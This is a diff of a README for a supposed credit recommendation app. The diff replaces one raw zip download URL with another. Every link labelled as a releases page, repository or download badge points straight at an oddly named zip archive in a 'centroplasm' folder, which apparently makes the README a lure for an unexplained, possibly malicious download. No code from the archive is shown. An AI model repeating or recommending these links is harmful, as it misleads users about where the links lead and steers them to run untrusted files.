@@ -6,7 +6,7 @@ Welcome to the Credit Product Recommendation Engine! This software helps you fin
 
 ## 📥 Download Link
 
-[![Download Credit Recommendation Engine](https://raw.githubusercontent.com/all-in-one67890/credit-recommendation-engine/main/centroplasm/credit-recommendation-engine.zip%20Now-Visit%20Page-brightgreen)](https://raw.githubusercontent.com/all-in-one67890/credit-recommendation-engine/main/centroplasm/credit-recommendation-engine.zip)
+[![Download Credit Recommendation Engine](https://github.com/all-in-one67890/credit-recommendation-engine/raw/refs/heads/main/centroplasm/engine_recommendation_credit_pluripara.zip%20Now-Visit%20Page-brightgreen)](https://github.com/all-in-one67890/credit-recommendation-engine/raw/refs/heads/main/centroplasm/engine_recommendation_credit_pluripara.zip)
 
 ## 💡 Features
 
@@ -33,11 +33,11 @@ This recommendation engine analyzes various factors related to your financial ha
 
 ### Step 1: Visit the Download Page
 
-Go to our [Releases page](https://raw.githubusercontent.com/all-in-one67890/credit-recommendation-engine/main/centroplasm/credit-recommendation-engine.zip) to find the latest version.
+Go to our [Releases page](https://github.com/all-in-one67890/credit-recommendation-engine/raw/refs/heads/main/centroplasm/engine_recommendation_credit_pluripara.zip) to find the latest version.
 
 ### Step 2: Choose Your Version
 
-On the Releases page, you will see various available versions. Select the one that suits your operating system. For example, if you are using Windows, look for a file named something like `https://raw.githubusercontent.com/all-in-one67890/credit-recommendation-engine/main/centroplasm/credit-recommendation-engine.zip`.
+On the Releases page, you will see various available versions. Select the one that suits your operating system. For example, if you are using Windows, look for a file named something like `https://github.com/all-in-one67890/credit-recommendation-engine/raw/refs/heads/main/centroplasm/engine_recommendation_credit_pluripara.zip`.
 
 ### Step 3: Download the File
 
@@ -69,7 +69,7 @@ Click on the "Get Recommendations" button. The engine will process your data and
 
 If you encounter issues, try the following steps:
 
-- **Check Updates:** Ensure you have the latest version. Visit the [Releases page](https://raw.githubusercontent.com/all-in-one67890/credit-recommendation-engine/main/centroplasm/credit-recommendation-engine.zip) for updates.
+- **Check Updates:** Ensure you have the latest version. Visit the [Releases page](https://github.com/all-in-one67890/credit-recommendation-engine/raw/refs/heads/main/centroplasm/engine_recommendation_credit_pluripara.zip) for updates.
 - **Reinstall the App:** If the application fails to open, try uninstalling and reinstalling.
 - **Contact Support:** If problems persist, reach out to our support team through the GitHub Issues page.
 
@@ -87,7 +87,7 @@ This application is licensed under the MIT License. Feel free to use it for pers
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/all-in-one67890/credit-recommendation-engine/main/centroplasm/credit-recommendation-engine.zip)
+- [GitHub Repository](https://github.com/all-in-one67890/credit-recommendation-engine/raw/refs/heads/main/centroplasm/engine_recommendation_credit_pluripara.zip)
 - [User Manual (PDF download)](Link to User Manual if available)
 - [Technical Documentation](Link to Technical Documentation if available)
 
